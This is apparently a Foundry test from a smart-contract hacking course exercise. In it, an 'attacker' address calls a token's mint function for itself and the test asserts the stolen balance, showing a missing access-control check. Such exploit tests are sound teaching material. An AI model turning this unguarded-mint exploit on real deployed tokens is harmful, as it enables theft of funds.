// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ToTheMoon} from "../../src/access-control-2/ToTheMoon.sol";

contract TestAC2 is Test {
    address deployer;
    address user1;
    address attacker;

    ToTheMoon toTheMoon;

    uint256 constant INITIAL_MINT = 100 ether;
    uint256 constant USER_MINT = 10 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        user1 = makeAddr("user1");
        attacker = makeAddr("attacker");

        vm.startPrank(deployer);
        toTheMoon = new ToTheMoon(INITIAL_MINT);
        toTheMoon.mint(user1, USER_MINT);
        vm.stopPrank();
    }

    function test_Hack() public {
        vm.prank(attacker);
        toTheMoon.mint(attacker, 2_000_000);

        assertEq(toTheMoon.balanceOf(attacker), 2_000_000);
    }
}
